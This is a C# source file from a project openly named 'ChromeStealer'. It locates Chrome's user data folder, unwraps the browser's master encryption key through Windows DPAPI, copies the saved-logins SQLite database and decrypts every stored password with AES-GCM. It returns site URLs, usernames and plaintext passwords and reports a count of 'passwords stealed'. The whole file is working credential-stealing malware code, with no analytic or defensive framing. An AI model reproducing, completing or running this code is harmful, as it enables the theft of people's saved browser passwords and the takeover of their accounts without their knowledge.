using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using ChromeStealer.Models;
using System.Security.Cryptography;
using System.Text;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace ChromeStealer
{
    public static class ChromeDataRepository
    {
        private static string LocalAppDataFolder => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private static readonly string UserDataFolderPath = Path.Combine(LocalAppDataFolder, 
            "Google", "Chrome", "User Data/");

        private static readonly string LoginDataFilePath = Path.Combine(UserDataFolderPath, "Default", "Login Data");

        private static readonly string LocalStateFilePath = Path.Combine(UserDataFolderPath, "Local State");

        private static readonly string LoginDataTempFilePath =
            Path.Combine(Environment.CurrentDirectory, "chr_temp.db");
        
        private static readonly AesGcm AesInstance;

        private static byte[] GetCryptKey()
        {
            var localStateRaw = File.ReadAllText(LocalStateFilePath);
            var localState = JsonConvert.DeserializeObject<JObject>(localStateRaw);
            var encryptedKeyString = localState?["os_crypt"]?["encrypted_key"]?.Value<string>();
            if (encryptedKeyString == null) return null;
            var encryptedKey = Convert.FromBase64String(encryptedKeyString)[5..];
            var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            return decryptedKey;
        }

        private static readonly byte[] EncryptedKey = GetCryptKey();

        static ChromeDataRepository()
        {
            AesInstance = new AesGcm(EncryptedKey);
        }

        private static string DecryptPassword(byte[] encryptedPassword)
        {
            var encryptedPasswordSpan = new Span<byte>(encryptedPassword);
            
            var nonce = encryptedPasswordSpan[3..15];
            var cipher = encryptedPasswordSpan[15..^16];
            var tag = encryptedPasswordSpan[^16..];
            
            var cipherSize = cipher.Length;

            var plainTextBytes = cipherSize < 1024
                ? stackalloc byte[cipherSize]
                : new byte[cipherSize];
            
            AesInstance.Decrypt(nonce, cipher, tag, plainTextBytes);
            var plainText = Encoding.UTF8.GetString(plainTextBytes);
            return plainText;
        }

        public static List<LoginData> GetLoginData()
        {
            var loginData = new List<LoginData>();
            
            File.Copy(LoginDataFilePath, LoginDataTempFilePath, true);
            var dataTable = new DataTable();
            using (var dbConnection = new SQLiteConnection($@"Data Source={LoginDataTempFilePath};Version=3;New=True;Compress=True;"))
            {
                const string selectQuery = 
                    "SELECT id, origin_url, action_url, username_element, username_value, password_element, password_value FROM logins";
                var command = new SQLiteCommand(selectQuery, dbConnection);
                var adapter = new SQLiteDataAdapter(command);
                adapter.Fill(dataTable);
            }

            var passwordsCount = (Successes: 0, Fails: 0, Empty: 0);
            
            var rows = dataTable.Rows.Count;
            for (var i = 0; i < rows; i++)
            {
                var row = dataTable.Rows[i];

                var passwordBytes = (byte[]) row["password_value"];

                string password;
                try
                {
                    // var decryptedPasswordBytes = ProtectedData.Unprotect(passwordBytes,
                    //     EncryptedKey, DataProtectionScope.CurrentUser);
                    // var decryptedPasswordBytes = DecryptPassword(passwordBytes);
                    password = DecryptPassword(passwordBytes);
                    if (string.IsNullOrWhiteSpace(password))
                    {
                        passwordsCount.Empty++;
                    }
                    else
                    {
                        passwordsCount.Successes++;
                    }
                }
                catch (Exception exception)
                {
                    Console.WriteLine($"{exception.GetType().Name}: {exception.Message}");
                    password = "";
                    passwordsCount.Fails++;
                }
                
                loginData.Add(new LoginData(
                    int.Parse(row["id"].ToString() ?? "0"),
                    row["origin_url"].ToString(),
                    row["action_url"].ToString(),
                    row["username_element"].ToString(),
                    row["username_value"].ToString(),
                    row["password_element"].ToString(),
                    password));
            }
            
            Console.WriteLine($"Passwords stealed: {passwordsCount.Successes}, empty: {passwordsCount.Empty}, fails: {passwordsCount.Fails}.");

            try
            {
                File.Delete(LoginDataTempFilePath);
            }
            catch (Exception exception)
            {
                Console.WriteLine($"Unable to delete temp database file:\n{exception}");
            }
            
            return loginData;
        }
    }
}